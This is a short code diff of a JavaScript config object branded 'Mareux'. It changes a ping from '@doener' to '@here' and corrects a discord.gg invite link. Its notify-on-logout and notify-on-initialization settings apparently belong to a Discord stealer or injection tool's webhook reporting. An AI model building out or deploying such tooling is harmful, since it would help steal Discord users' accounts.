@@ -20,7 +20,7 @@ var config = {
 
     notify_on_logout: true,
     notify_on_initialization: true,
-    ping: [true, "@doener"],
+    ping: [true, "@here"],
 
     embed: {
         username: "Mareux | discord.gg/mareux",
@@ -28,7 +28,7 @@ var config = {
             text: `Mareux | discord.gg/mareux`,
             icon_url: "https://media.discordapp.net/attachments/1076860114008543233/1087424479493378099/ff1414427d3864c81e6e342c86af199f.png",
         },
-        href: "https://discord.gg//mareux",
+        href: "https://discord.gg/mareux",
         avatar_url: "https://media.discordapp.net/attachments/1076860114008543233/1087424479493378099/ff1414427d3864c81e6e342c86af199f.png"
     },
 
